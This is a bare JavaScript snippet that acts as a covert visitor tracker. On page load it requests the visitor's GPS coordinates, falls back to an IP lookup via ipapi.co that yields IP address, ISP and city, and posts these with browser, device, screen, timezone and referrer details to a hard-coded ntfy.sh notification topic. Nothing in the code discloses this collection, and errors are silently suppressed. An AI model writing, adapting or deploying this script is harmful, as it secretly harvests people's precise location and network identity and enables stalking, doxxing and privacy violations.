(function () {
  'use strict';

  var NTFY_TOPIC = 'kQ8f3jY2m1pXz9NcVw7bL4rT6sHdG0eA';
  var NTFY_URL   = 'https://ntfy.sh/' + NTFY_TOPIC;

  function getOS() {
    var ua = navigator.userAgent;
    if (/Windows NT 10/.test(ua))  return 'Windows 10/11';
    if (/Windows NT 6\.3/.test(ua)) return 'Windows 8.1';
    if (/Windows NT 6\.1/.test(ua)) return 'Windows 7';
    if (/Mac OS X/.test(ua))       return 'macOS ' + (ua.match(/Mac OS X ([\d_]+)/) || ['','?'])[1].replace(/_/g,'.');
    if (/Android/.test(ua))        return 'Android ' + (ua.match(/Android ([\d.]+)/) || ['','?'])[1];
    if (/iPhone|iPad/.test(ua))    return 'iOS ' + (ua.match(/OS ([\d_]+)/) || ['','?'])[1].replace(/_/g,'.');
    if (/Linux/.test(ua))          return 'Linux';
    return 'Unknown OS';
  }

  function getBrowser() {
    var ua = navigator.userAgent;
    if (/Edg\//.test(ua))     return 'Edge '    + (ua.match(/Edg\/([\d.]+)/)     || ['','?'])[1];
    if (/OPR\//.test(ua))     return 'Opera '   + (ua.match(/OPR\/([\d.]+)/)     || ['','?'])[1];
    if (/Chrome\//.test(ua))  return 'Chrome '  + (ua.match(/Chrome\/([\d.]+)/)  || ['','?'])[1];
    if (/Firefox\//.test(ua)) return 'Firefox ' + (ua.match(/Firefox\/([\d.]+)/) || ['','?'])[1];
    if (/Safari\//.test(ua))  return 'Safari '  + (ua.match(/Version\/([\d.]+)/) || ['','?'])[1];
    return 'Unknown Browser';
  }

  function getDeviceType() {
    var ua = navigator.userAgent;
    if (/Mobi|Android/i.test(ua)) return 'Mobile';
    if (/Tablet|iPad/i.test(ua))  return 'Tablet';
    return 'Desktop';
  }

  function sendNotification(locationLine) {
    var screen_info = window.screen.width + 'x' + window.screen.height +
                      ' (viewport: ' + window.innerWidth + 'x' + window.innerHeight + ')' +
                      ' depth:' + window.screen.colorDepth + 'bit';

    var body = [
      'Page     : ' + window.location.href,
      'Location : ' + locationLine,
      'OS       : ' + getOS(),
      'Browser  : ' + getBrowser(),
      'Device   : ' + getDeviceType(),
      'Screen   : ' + screen_info,
      'Timezone : ' + Intl.DateTimeFormat().resolvedOptions().timeZone,
      'Language : ' + navigator.language,
      'Referrer : ' + (document.referrer || 'Direct'),
      'Time     : ' + new Date().toUTCString(),
    ].join('\n');

    fetch(NTFY_URL, {
      method: 'POST',
      headers: {
        'Title'   : 'New Visitor',
        'Priority': 'default',
        'Tags'    : 'eyes,globe_with_meridians',
      },
      body: body,
    }).catch(function () {});
  }

  function fallbackToIP() {
    fetch('https://ipapi.co/json/')
      .then(function (r) { return r.json(); })
      .then(function (d) {
        sendNotification(
          (d.city || '?') + ', ' + (d.region || '?') + ', ' + (d.country_name || '?') +
          ' | IP: ' + (d.ip || '?') +
          ' | ISP: ' + (d.org || '?') +
          ' (IP-based)'
        );
      })
      .catch(function () { sendNotification('Location unavailable'); });
  }

  if (navigator.geolocation) {
    navigator.geolocation.getCurrentPosition(
      function (pos) {
        var lat = pos.coords.latitude.toFixed(5);
        var lon = pos.coords.longitude.toFixed(5);
        var acc = Math.round(pos.coords.accuracy);
        sendNotification(
          'GPS ' + lat + ', ' + lon + ' (+/-' + acc + 'm)' +
          ' | https://maps.google.com/?q=' + lat + ',' + lon
        );
      },
      function () { fallbackToIP(); },
      { timeout: 6000 }
    );
  } else {
    fallbackToIP();
  }

})();